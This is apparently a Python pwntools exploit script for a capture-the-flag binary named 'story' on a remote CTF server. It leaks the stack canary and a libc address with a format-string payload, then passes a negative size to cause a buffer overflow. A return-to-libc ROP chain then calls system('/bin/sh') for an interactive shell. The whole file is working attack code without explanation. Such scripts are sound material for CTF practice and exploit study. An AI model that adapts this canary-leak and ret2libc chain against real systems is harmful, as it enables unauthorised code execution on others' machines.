from pwn import *

# p = process("./story")
p = remote("ctf3.linkedbyx.com" , 11315)
elf = ELF("./story")
libc = elf.libc

# leak canary and libc
p.sendlineafter("Please Tell Your ID:" , "%15$p%25$p")
text = p.recvuntil("\n" , drop = True).split("0x")[1:]
canary = int("0x" + text[0] , 16)
libc_start_main = int("0x" + text[1] , 16) - 240
libc.address = libc_start_main - libc.sym["__libc_start_main"]
log.info("canary : " + hex(canary))
log.info("libc : " + hex(libc.address))
log.info("system : " + hex(libc.sym["system"]))
# get shell
p.sendlineafter("Tell me the size of your story:" , str(-9223372036854775808))
pop_rdi = 0x0000000000400bd3
payload = "a" * 0x88 + p64(canary) + "b" * 8 + p64(pop_rdi) + p64(libc.search("/bin/sh\x00").next()) + p64(libc.sym["system"])
p.sendafter("You can speak your story:" , payload)
p.interactive()


